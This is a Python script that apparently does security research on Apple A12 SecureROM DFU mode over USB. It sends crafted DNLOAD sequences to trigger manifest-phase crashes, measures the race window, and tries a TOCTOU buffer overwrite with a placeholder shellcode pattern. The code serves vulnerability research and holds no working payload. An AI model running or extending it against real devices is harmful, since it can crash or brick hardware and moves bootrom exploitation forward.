#!/usr/bin/env python3
"""
A12 SecureROM — TOCTOU + Manifest Crash Analysis
==================================================
KEY FINDINGS:
  1. DNLOAD during manifest is ACCEPTED → buffer overwrite possible
  2. 15B DNLOAD doesn't crash → crash is during MANIFEST of small payloads
  3. wValue (block number) is ignored

ATTACK VECTORS:
  A. Manifest crash: DNLOAD(small) → trigger manifest → crash analysis
  B. TOCTOU: Start manifest with valid data → overwrite buffer mid-process
  C. Race window measurement: how big is the manifest processing window?
"""
import time, json, struct, statistics, threading
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227
be = lambda: usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)

class TOCTOUAttack:
    def __init__(self):
        self.dev = None

    def connect(self):
        self.dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be())
        if self.dev:
            try: self.dev.set_configuration()
            except: pass
            return True
        return False

    def ctrl(self, rt, req, val, idx, d, timeout=5000):
        return self.dev.ctrl_transfer(rt, req, val, idx, d, timeout=timeout)

    def status(self):
        try:
            r = self.ctrl(0xA1, 3, 0, 0, 6)
            return (r[4], r[0], r[1]|(r[2]<<8)|(r[3]<<16)) if len(r)>=6 else None
        except: return None

    def to_idle(self):
        for _ in range(20):
            s = self.status()
            if not s: time.sleep(0.1); self.connect(); continue
            if s[0] == 2: return True
            if s[0] == 10: self.ctrl(0x21, 4, 0, 0, 0)
            elif s[0] == 4: time.sleep(s[2]/1000+0.01); self.status()
            try: self.ctrl(0x21, 6, 0, 0, 0)
            except: pass
            time.sleep(0.02)
        return False

    def alive(self):
        try: return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be()) is not None
        except: return False

    def wait_reappear(self, timeout=10):
        t0 = time.time()
        while time.time() - t0 < timeout:
            if self.alive():
                self.connect()
                return True
            time.sleep(0.2)
        return False

    def trigger_manifest(self, payload):
        """DNLOAD + GET_STATUS + zero-length DNLOAD + GET_STATUS = manifest"""
        if not self.to_idle(): return None

        try: self.ctrl(0x21, 1, 0, 0, payload, timeout=5000)
        except: return None

        s = self.status()
        if not s or s[0] != 5: return None

        # Zero-length → manifest
        try: self.ctrl(0x21, 1, 0, 0, b"", timeout=5000)
        except: pass

        # GET_STATUS triggers manifest
        s = self.status()
        return s

    def run(self):
        log("="*60)
        log("A12 — TOCTOU + Manifest Crash Analysis")
        log("="*60)

        if not self.connect():
            log("NO DFU DEVICE"); return

        results = {"timestamp": datetime.now().isoformat()}

        # =============================================================
        # Test A: Manifest crash with small payloads
        # Does the manifest crash when processing <16B?
        # =============================================================
        log("\n=== Test A: Manifest Crash with Small Payloads ===")
        log("  DNLOAD(small) → GET_STATUS → zero-len DNLOAD → GET_STATUS → poll")

        manifest_crash_tests = []

        for size in [0, 1, 2, 4, 8, 12, 15, 16, 20, 32, 64]:
            if not self.to_idle():
                if not self.wait_reappear(): break
                self.to_idle()

            payload = bytes(size)

            # Step 1: DNLOAD
            t0 = time.perf_counter_ns()
            try:
                self.ctrl(0x21, 1, 0, 0, payload, timeout=5000)
                dnload_ok = True
            except usb.core.USBError as e:
                dnload_ok = False
                manifest_crash_tests.append({
                    "size": size, "dnload_ok": False, "error": str(e)
                })
                log(f"  {size:3d}B: DNLOAD FAIL: {e}")
                continue
            t1 = time.perf_counter_ns()

            # Step 2: GET_STATUS
            s = self.status()
            if not s:
                manifest_crash_tests.append({"size": size, "error": "no_status"})
                log(f"  {size:3d}B: no status after DNLOAD")
                continue

            state1 = s[0]

            # If not in DNLOAD-IDLE, something different happened
            if state1 != 5:
                manifest_crash_tests.append({
                    "size": size, "state_after_dnload": state1,
                    "note": "not in DNLOAD-IDLE"
                })
                log(f"  {size:3d}B: state after DNLOAD = {state1} (not 5)")
                continue

            # Step 3: Zero-length DNLOAD → trigger manifest
            try:
                self.ctrl(0x21, 1, 0, 0, b"", timeout=5000)
            except usb.core.USBError as e:
                manifest_crash_tests.append({"size": size, "error": f"zl_fail: {e}"})
                log(f"  {size:3d}B: zero-length DNLOAD fail: {e}")
                continue

            t2 = time.perf_counter_ns()

            # Step 4: GET_STATUS → enter manifest
            s = self.status()
            t3 = time.perf_counter_ns()

            if not s:
                # Device may have crashed!
                alive = self.alive()
                manifest_crash_tests.append({
                    "size": size, "error": "no_status_after_manifest_trigger",
                    "alive": alive
                })
                log(f"  {size:3d}B: NO STATUS after manifest trigger! alive={alive}")
                if not alive: self.wait_reappear()
                continue

            manifest_state = s[0]

            # Step 5: Poll to completion (or crash)
            states = [(s[0], (t3-t0)/1000)]
            for _ in range(200):
                if s[0] in (2, 8, 10): break
                if s[0] == 4: time.sleep(s[2]/1000)
                s = self.status()
                if not s: break
                states.append((s[0], (time.perf_counter_ns()-t0)/1000))
            
            t_end = time.perf_counter_ns()
            total_us = (t_end - t0) / 1000
            alive = self.alive()

            # State flow
            flow = []
            prev = None
            for st, us in states:
                if st != prev:
                    flow.append(st)
                    prev = st

            manifest_crash_tests.append({
                "size": size,
                "dnload_us": round((t1-t0)/1000, 1),
                "total_us": round(total_us, 1),
                "manifest_entry": manifest_state,
                "final_state": flow[-1] if flow else None,
                "state_flow": flow,
                "alive": alive,
            })

            log(f"  {size:3d}B: total={total_us:>8.0f}us flow={flow} "
                f"alive={alive}")

            if not alive:
                log(f"  >>> CRASH at {size}B!")
                self.wait_reappear()

        results["manifest_crash"] = manifest_crash_tests

        # =============================================================
        # Test B: Race window — how long is manifest processing?
        # =============================================================
        log("\n=== Test B: Manifest Processing Window ===")
        log("  Trigger manifest → rapid GET_STATE polling")

        if not self.to_idle():
            self.wait_reappear(); self.to_idle()

        window_tests = []
        for payload_desc, payload in [
            ("zeros_16B",   bytes(16)),
            ("zeros_2048B", bytes(2048)),
            ("img4_2048B",  b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038)),
        ]:
            if not self.to_idle():
                if not self.wait_reappear(): break
                self.to_idle()

            # DNLOAD
            try: self.ctrl(0x21, 1, 0, 0, payload, timeout=5000)
            except: continue
            self.status()  # → state 5

            # Zero-length → manifest
            try: self.ctrl(0x21, 1, 0, 0, b"", timeout=5000)
            except: pass

            # Rapid polling to see state transitions with timing
            t0 = time.perf_counter_ns()
            state_log = []
            for i in range(200):
                s = self.status()
                t = (time.perf_counter_ns() - t0) / 1000
                if not s: break
                state_log.append({"i": i, "state": s[0], "us": round(t, 1),
                                  "bstatus": s[1], "poll": s[2]})
                if s[0] in (2, 8, 10): break

            # Find transitions
            transitions = []
            prev = None
            for entry in state_log:
                if entry["state"] != prev:
                    transitions.append(entry)
                    prev = entry["state"]

            window_tests.append({
                "payload": payload_desc,
                "n_polls": len(state_log),
                "transitions": transitions,
                "total_us": state_log[-1]["us"] if state_log else 0,
            })

            log(f"  {payload_desc:15s}: {len(state_log)} polls, transitions:")
            for t in transitions:
                log(f"    state={t['state']} at {t['us']:.0f}us (bstatus={t['bstatus']} poll={t['poll']})")

        results["manifest_window"] = window_tests

        # =============================================================
        # Test C: TOCTOU — Overwrite buffer during manifest
        # =============================================================
        log("\n=== Test C: TOCTOU — Buffer Overwrite During Manifest ===")
        log("  Manifest(trigger) → wait Xus → DNLOAD(overwrite)")
        
        toctou_tests = []

        # Initial payload: valid-looking DER
        initial = b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038)
        # Overwrite: shellcode pattern
        overwrite = b"\xDE\xAD\xBE\xEF" * 512  # 2048B

        for delay_us in [0, 100, 200, 500, 1000, 1500, 2000, 2500, 3000]:
            if not self.to_idle():
                if not self.wait_reappear(): break
                self.to_idle()

            # Start manifest
            try: self.ctrl(0x21, 1, 0, 0, initial, timeout=5000)
            except: continue
            s = self.status()
            if not s or s[0] != 5: continue

            try: self.ctrl(0x21, 1, 0, 0, b"", timeout=5000)
            except: pass

            # GET_STATUS to start manifest processing
            s = self.status()
            t0 = time.perf_counter_ns()
            manifest_entry = s[0] if s else None

            # Wait precise delay
            if delay_us > 0:
                target = t0 + delay_us * 1000
                while time.perf_counter_ns() < target:
                    pass  # busy-wait for precision

            # OVERWRITE buffer!
            t_overwrite = time.perf_counter_ns()
            try:
                self.ctrl(0x21, 1, 0, 0, overwrite, timeout=5000)
                overwrite_ok = True
            except usb.core.USBError as e:
                overwrite_ok = False
            t_after = time.perf_counter_ns()

            # Check state
            s = self.status()
            alive = self.alive()

            actual_delay = (t_overwrite - t0) / 1000

            toctou_tests.append({
                "target_delay_us": delay_us,
                "actual_delay_us": round(actual_delay, 1),
                "manifest_entry": manifest_entry,
                "overwrite_ok": overwrite_ok,
                "state_after": s[0] if s else None,
                "alive": alive,
            })

            log(f"  delay={delay_us:5d}us (actual={actual_delay:.0f}us): "
                f"entry={manifest_entry} overwrite={'OK' if overwrite_ok else 'FAIL'} "
                f"final={s[0] if s else 'X'} alive={alive}")

            if not alive:
                log(f"  >>> CRASH at delay {delay_us}us!")
                self.wait_reappear()

        results["toctou"] = toctou_tests

        # =============================================================
        # Test D: TOCTOU with tiny overwrite (trigger <16B crash mid-manifest)
        # =============================================================
        log("\n=== Test D: TOCTOU Mini — Tiny DNLOAD During Manifest ===")
        log("  Manifest(2048B) → DNLOAD(1-15B) during processing")

        tiny_toctou = []

        for trig_size in [0, 1, 4, 8, 15]:
            for delay_us in [0, 500, 1000, 2000]:
                if not self.to_idle():
                    if not self.wait_reappear(): break
                    self.to_idle()

                # Start manifest with 2048B
                try: self.ctrl(0x21, 1, 0, 0, bytes(2048), timeout=5000)
                except: continue
                s = self.status()
                if not s or s[0] != 5: continue

                try: self.ctrl(0x21, 1, 0, 0, b"", timeout=5000)
                except: pass
                s = self.status()
                t0 = time.perf_counter_ns()

                # Wait
                if delay_us > 0:
                    target = t0 + delay_us * 1000
                    while time.perf_counter_ns() < target: pass

                # Tiny DNLOAD
                try:
                    self.ctrl(0x21, 1, 0, 0, bytes(trig_size), timeout=5000)
                    ok = True
                except usb.core.USBError:
                    ok = False
                
                s = self.status()
                alive = self.alive()

                tiny_toctou.append({
                    "trig_size": trig_size,
                    "delay_us": delay_us,
                    "ok": ok,
                    "state": s[0] if s else None,
                    "alive": alive,
                })

                log(f"  size={trig_size:2d}B delay={delay_us:5d}us: "
                    f"{'OK' if ok else 'FAIL'} state={s[0] if s else 'X'} alive={alive}")

                if not alive:
                    log(f"  >>> CRASH!")
                    self.wait_reappear()

        results["tiny_toctou"] = tiny_toctou

        # Save
        outf = Path(__file__).parent / "results" / "toctou_analysis.json"
        outf.parent.mkdir(exist_ok=True)
        with open(outf, "w") as f:
            json.dump(results, f, indent=2)
        log(f"\nSaved: {outf}")
        log("DONE")

if __name__ == "__main__":
    TOCTOUAttack().run()
